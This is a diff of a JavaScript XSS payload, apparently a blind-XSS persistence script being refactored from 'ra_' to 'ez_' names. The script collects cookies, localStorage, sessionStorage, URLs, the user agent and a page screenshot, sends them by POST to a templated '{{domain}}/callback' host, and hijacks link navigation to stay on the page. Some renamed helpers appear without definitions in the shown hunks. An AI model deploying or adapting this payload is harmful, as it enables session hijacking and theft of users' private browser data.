@@ -1,7 +1,3 @@
-function ra_n(e) {
-    return void 0 !== e ? e : ""
-}
-
 var pi;
 var last = '';
 
@@ -17,13 +13,12 @@ function ping() {
 function init() {
     // Ready to persist
     ra_hL();
-    ra_cb(ra_rD);
+    ez_cb(ez_rD);
 }
 
-function ra_cb(e) { var t = new XMLHttpRequest; t.open("POST", "https://{{domain}}/callback", !0), t.setRequestHeader("Content-type", "text/plain"), t.onreadystatechange = function () { 4 == t.readyState && t.status }, t.send(JSON.stringify(e)) }
-
-function ra_first() {
+function ez_persist() {
     init();
+    ping();
 }
 
 function ra_client() {
@@ -48,80 +43,72 @@ function ra_client() {
 
 function ra_hL() {
     try {
-        ra_rD.clientid = ra_client()
+        ez_rD.clientid = ra_client()
     } catch (e) {
-        ra_rD.clientid = ""
+        ez_rD.clientid = ""
     }
     try {
-        ra_rD.method = "persist"
+        ez_rD.method = "persist"
     } catch (e) {
-        ra_rD.method = ""
+        ez_rD.method = ""
     }
     try{ez_rD.payload="{{domain}}"}catch(e){ez_rD.payload=""}
     try {
-        ra_rD.uri = ra_n(location.toString())
+        ez_rD.uri = ez_n(location.toString())
     } catch (e) {
-        ra_rD.uri = ""
+        ez_rD.uri = ""
     }
     try {
-        ra_rD.cookies = ra_n(document.cookie)
+        ez_rD.cookies = ez_n(document.cookie)
     } catch (e) {
-        ra_rD.cookies = ""
+        ez_rD.cookies = ""
     }
     try {
         if(last != '') {
-            ra_rD.referer = ra_n(last)
+            ez_rD.referer = ez_n(last)
         } else {
-            ra_rD.referer = ra_n(document.referrer)
+            ez_rD.referer = ez_n(document.referrer)
         }
     } catch (e) {
-        ra_rD.referer = ""
+        ez_rD.referer = ""
     }
     try {
-        ra_rD["user-agent"] = ra_n(navigator.userAgent)
+        ez_rD["user-agent"] = ez_n(navigator.userAgent)
     } catch (e) {
-        ra_rD["user-agent"] = ""
+        ez_rD["user-agent"] = ""
     }
     try {
-        ra_rD.origin = ra_n(location.origin)
+        ez_rD.origin = ez_n(location.origin)
     } catch (e) {
-        ra_rD.origin = ""
+        ez_rD.origin = ""
     }
     try {
-        ra_rD.localstorage = ra_n(window.localStorage);
+        ez_rD.localstorage = ez_n(window.localStorage);
     } catch (e) {
-        ra_rD.localstorage = "";
+        ez_rD.localstorage = "";
     }
     try {
-        ra_rD.sessionstorage = ra_n(window.sessionStorage);
+        ez_rD.sessionstorage = ez_n(window.sessionStorage);
     } catch (e) {
-        ra_rD.sessionstorage = "";
+        ez_rD.sessionstorage = "";
     }
     try {
-        ra_rD.dom = ""; //ra_n(document.documentElement.outerHTML)
+        ez_rD.dom = ""; //ez_n(document.documentElement.outerHTML)
     } catch (e) {
-        ra_rD.dom = ""
+        ez_rD.dom = ""
     }
     try {
         html2canvas(document.body).then(function (e) {
-            ra_rD.screenshot = ra_n(e.toDataURL()), ra_c();
+            ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
         });
     } catch (e) {
-        ra_rD.screenshot = "", ra_c()
+        ez_rD.screenshot = "", ra_c()
     }
 
     function ra_c() {
         ra_r()
     }
 }
-
-function ra_aE(e, t, n) {
-    e.addEventListener ? e.addEventListener(t, n, !1) : e.attachEvent && e.attachEvent("on" + t, n)
-}
-
-ra_rD = {}, "complete" == document.readyState ? ra_first() : ra_aE(window, "load", function () {
-    ra_first()
-});
 
 function ra_r() {
     document.querySelectorAll('a').forEach(link => {
@@ -154,7 +141,7 @@ function ra_r() {
                             var request = new XMLHttpRequest();
                             request.onload = function () {
                                 if (this.readyState == 4) {
-                                    last = ra_n(location.toString());
+                                    last = ez_n(location.toString());
                                     document.getElementsByTagName("html")[0].innerHTML = this.responseText;
                                     window.scrollTo(0, 0);
                                     let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
